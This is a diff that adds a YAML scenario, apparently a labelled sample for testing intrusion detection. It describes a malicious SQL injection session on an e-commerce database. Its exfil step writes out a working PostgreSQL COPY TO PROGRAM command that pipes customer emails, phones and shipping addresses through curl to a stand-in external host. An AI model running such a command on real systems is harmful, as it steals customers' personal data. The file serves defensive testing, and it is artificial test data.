@@ -1,0 +1,33 @@
+scenario_id: gen_ecommerce_51_sql_injection_mal_1439m
+family_id: gen_ecommerce_51_sql_injection_fam_1439
+domain: ecommerce
+time_of_day: 03:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT order_item_id, quantity FROM order_items WHERE order_id = 154785 AND
+      (SELECT count(*) FROM customers) > 0
+  - step_id: exfil
+    sql: COPY (SELECT email, phone, shipping_address FROM customers) TO PROGRAM 'curl
+      -sX POST https://analytics-mirror.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 45.77.120.59
+      port: 8080
+matched_pair_id: gen_ecommerce_51_sql_injection_pair_1439
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
